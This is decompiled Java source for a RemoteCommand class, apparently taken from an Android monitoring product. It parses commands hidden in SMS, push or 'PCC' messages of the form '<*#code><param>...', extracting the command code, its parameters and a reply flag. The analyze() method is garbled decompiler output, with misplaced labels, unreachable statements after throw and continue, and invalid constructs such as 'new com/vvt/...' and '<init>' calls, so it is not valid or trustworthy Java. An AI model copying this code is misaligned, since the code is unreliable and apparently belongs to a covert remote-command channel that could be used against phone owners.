package com.vvt.remotecommand;

import com.vvt.ak.a;
import com.vvt.remotecommand.exception.CommandParsingFailedException;
import java.io.Serializable;
import java.util.ArrayList;

public class RemoteCommand implements Serializable {
    enum RemoteCommand$Type {
        PCC,
        SMS_COMMAND,
        PUSH
    }

    private static final boolean a = false;
    private static final boolean b = a.b;
    private static final long serialVersionUID = -7651225977689319850L;
    private String code;
    private String data;
    private boolean isReplyMessageRequired;
    private ArrayList parameters;
    private String recipient;
    private String sender;
    private RemoteCommand.Type type;

    static {
        boolean bool = a.a;
        if (bool) {}
    }

    public RemoteCommand() {
        this.parameters = new java.util.ArrayList();
    }

    public void analyze() {
        int i = 62;
        int j = 60;
        int k = -1;
        int m = 1;
        int n = 0;
        Object localObject1 = null;
        boolean bool1 = a;
        if (bool1) {}
        this.parameters.clear();
        for (;;) {
            String str;
            int i5;
            try {
                str = this.data.trim();
                bool1 = a;
                if (bool1) {}
                localObject2 = this.type;
                localObject4 = RemoteCommand.Type.PCC;
                if (localObject2 != localObject4) {
                    localObject2 = this.type;
                    localObject4 = RemoteCommand.Type.PUSH;
                    if (localObject2 != localObject4) {}
                } else {
                    i5 = str.indexOf("<");
                    bool1 = m;
                    if (i5 != k) {
                        break label203;
                    }
                    localObject2 = new com.vvt.remotecommand.exception.CommandParsingFailedException();
                    throw ((Throwable)localObject2);
                }
            } catch (Exception localException) {
                bool1 = b;
                if (bool1) {}
                throw new com.vvt.remotecommand.exception.CommandParsingFailedException();
            }

            Object localObject3 = this.type;
            Object localObject4 = RemoteCommand.Type.SMS_COMMAND;
            label203:
            boolean bool5;
            if (localObject3 == localObject4) {
                localObject3 = "<*#";
                i5 = str.indexOf((String)localObject3);
                localObject3 = "<*#";
                int i1 = ((String)localObject3).length();
                continue;
                Object localObject5 = ">";
                int i6 = i5 + i1;
                k = str.indexOf((String)localObject5, i6);
                i1 += i5;
                localObject3 = str.substring(i1, k);
                this.code = ((String)localObject3);
                boolean bool2 = a;
                if (bool2) {}
                int i2 = k + 1;
                k = str.length();
                localObject4 = str.substring(i2, k);
                k = 0;
                localObject5 = null;
                i2 = 0;
                localObject3 = null;
                int i7 = ((String)localObject4).length();
                if (k < i7)
                {
                    i7 = ((String)localObject4).charAt(k);
                    if ((i2 >= 0) && (i2 <= m) && ((i2 != 0) || (i7 == j)))
                    {
                        i6 = ((String)localObject4).length() + -1;
                        if ((k != i6) || (i7 == i)) {}
                    }
                    else
                    {
                        i2 = 0;
                        localObject3 = null;
                    }
                }
                for (;;)
                {
                    if (i2 == 0)
                    {
                        localObject3 = new com/vvt/remotecommand/exception/CommandParsingFailedException;
                        ((CommandParsingFailedException)localObject3).<init>();
                        throw ((Throwable)localObject3);
                        if (i7 == j) {
                            i2 += 1;
                        }
                        for (;;)
                        {
                            k += 1;
                            break;
                            if (i7 == i) {
                                i2 += -1;
                            }
                        }
                    }
                    if (localObject4 != null)
                    {
                        localObject3 = ((String)localObject4).trim();
                        i2 = ((String)localObject3).length();
                        if (i2 > 0)
                        {
                            i2 = 1;
                            m = ((String)localObject4).length() + -1;
                            localObject3 = ((String)localObject4).substring(i2, m);
                            Object localObject6 = "><";
                            localObject6 = ((String)localObject3).split((String)localObject6);
                            localObject3 = this.type;
                            int i4;
                            if (localObject3 != null)
                            {
                                localObject3 = this.type;
                                localObject5 = RemoteCommand.Type.SMS_COMMAND;
                                if (localObject3 == localObject5)
                                {
                                    i2 = localObject6.length + -1;
                                    localObject3 = localObject6[i2];
                                    localObject5 = "d";
                                    boolean bool3 = ((String)localObject3).equalsIgnoreCase((String)localObject5);
                                    if (bool3) {
                                        bool3 = true;
                                    }
                                    for (this.isReplyMessageRequired = bool3;; this.isReplyMessageRequired = false)
                                    {
                                        bool3 = a;
                                        if (bool3) {}
                                        for (;;)
                                        {
                                            int i3 = localObject6.length;
                                            if (n >= i3) {
                                                break;
                                            }
                                            boolean bool4 = this.isReplyMessageRequired;
                                            if (bool4)
                                            {
                                                i4 = localObject6.length + -1;
                                                if (n == i4) {}
                                            }
                                            else
                                            {
                                                localObject3 = this.parameters;
                                                localObject5 = localObject6[n];
                                                ((ArrayList)localObject3).add(localObject5);
                                            }
                                            n += 1;
                                        }
                                        i4 = 0;
                                        localObject3 = null;
                                    }
                                }
                            }
                            localObject3 = this.type;
                            localObject5 = RemoteCommand.Type.PCC;
                            if (localObject3 != localObject5)
                            {
                                localObject3 = this.type;
                                localObject5 = RemoteCommand.Type.PUSH;
                                if (localObject3 != localObject5) {}
                            }
                            else
                            {
                                k = localObject6.length;
                                i4 = 0;
                                localObject3 = null;
                                while (i4 < k)
                                {
                                    localObject1 = localObject6[i4];
                                    localObject4 = this.parameters;
                                    ((ArrayList)localObject4).add(localObject1);
                                    i4 += 1;
                                }
                            }
                        }
                    }
                    bool5 = a;
                    if (bool5) {}
                    return;
                    bool5 = m;
                }
            }
            else
            {
                bool5 = k;
                i5 = k;
            }
        }
    }

    public String getCode()
    {
        return this.code;
    }

    public String getData()
    {
        return this.data;
    }

    public ArrayList getParameters()
    {
        return this.parameters;
    }

    public String getRecipient()
    {
        return this.recipient;
    }

    public String getSender()
    {
        return this.sender;
    }

    public RemoteCommand.Type getType()
    {
        return this.type;
    }

    public boolean isReplyMesageRequired()
    {
        return this.isReplyMessageRequired;
    }

    void setCode(String paramString)
    {
        this.code = paramString;
    }

    public void setData(String paramString)
    {
        this.data = paramString;
    }

    void setParameters(ArrayList paramArrayList)
    {
        this.parameters = paramArrayList;
    }

    public void setRecipient(String paramString)
    {
        this.recipient = paramString;
    }

    public void setReplyMessageRequired(boolean paramBoolean)
    {
        this.isReplyMessageRequired = paramBoolean;
    }

    public void setSender(String paramString)
    {
        this.sender = paramString;
    }

    public void setType(RemoteCommand.Type paramType)
    {
        this.type = paramType;
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/RemoteCommand.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */